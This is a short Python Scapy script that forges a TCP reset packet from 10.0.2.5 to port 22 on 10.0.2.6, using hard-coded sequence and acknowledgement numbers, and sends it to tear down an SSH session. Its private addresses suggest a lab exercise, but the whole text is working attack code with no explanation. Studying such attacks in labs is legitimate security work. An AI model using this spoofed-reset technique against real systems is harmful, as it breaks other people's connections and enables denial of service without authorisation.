#!/usr/bin/python
from scapy.all import *
ip = IP(src="10.0.2.5", dst="10.0.2.6")
tcp = TCP(sport=37122, dport=22, flags="R", seq=4117411908, ack=3522100439)
pkt = ip/tcp
ls(pkt)
send(pkt,verbose=0)